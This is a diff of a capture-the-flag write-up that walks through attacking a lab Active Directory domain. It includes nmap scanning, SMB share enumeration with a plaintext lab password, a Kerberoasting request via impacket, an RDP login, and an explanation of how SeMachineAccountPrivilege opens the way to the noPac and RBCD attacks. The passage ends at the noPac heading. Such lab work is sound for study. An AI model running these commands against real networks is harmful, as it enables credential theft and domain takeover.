@@ -5,7 +5,8 @@ password: JSmith@IT2024
 and walks through logging in remotely to the machine via RDP -> then exploiting a vulnerability in  SeMachineAccount Privilege to obtain Domain Admin access
 
 # Environment Set-Up:
-Machine_IP: 10.112.130.201                                                                               Before starting, DNS resolution must point to the Domain Controller. this is critical for Kerberos-based attacks, which we'll need later
+Machine_IP: 10.112.130.201  
+Before starting, DNS resolution must point to the Domain Controller. this is critical for Kerberos-based attacks, which we'll need later
 
 # Host Discovery & Port Scan:
 1. `nmap -sn 10.112.130.0/24 -T4`        to discover live hosts
@@ -22,7 +23,7 @@ Machine_IP: 10.112.130.201                                                      
 2. I enumerated SMB shares:  
   `netexec smb 10.112.130.201 -u j.smith -p JSmith@IT2024 --shares`
 <img width="1732" height="292" alt="Pasted image 20260831215926" src="https://github.com/user-attachments/assets/69b4687d-1495-4158-bf07-a50ad5b5dba0" />
-i tried to connect to each share but nothing is these
+i tried to connect to each share but nothing is there
 
 3. Kerberoasting:  
   `impacket/GetUserSPNs.py ctf.local/j.smith -dc-ip 10.112.130.201 -request`
@@ -48,10 +49,12 @@ users of this group are allowed to login remotely via RDP
 	` xfreerdp3 /dynamic-resolution +clipboard /cert:ignore /u:j.smith /p:JSmith@IT2024 /v:10.112.130.201`
 	and i successfully logged-in
 
-# Living Off the Land
-1. i opened cmd and check for groups and privielges:  
-`whoami /all`           i discovered that i have `SeMachineAccountPrivilege`
-[[SeMachineAccountPrivilege]]: is assigned by default to "Authenticated Users Group" and allows a user to create a "Computer Account Object" in AD (in the domain), and through that computer account "$" you exploit other vulnerabilities like (noPac/ Resource-Based Constrained Delegation)
+# Living Off the Land  
+i opened cmd and check for groups and privielges:  
+`whoami /all`           i discovered that i have `SeMachineAccountPrivilege`  
+
+"SeMachineAccountPrivilege": is assigned by default to "Authenticated Users Group" and allows a user to create a "Computer Account Object" in AD (in the domain),  
+through that computer account "$" you can exploit other vulnerabilities like (noPac/ Resource-Based Constrained Delegation)
 ------------------------
 
 # utilizing The "sAMAccountName" Spoofing Attack (noPac) / CVE-2021-42278 & CVE-2021-42287: 
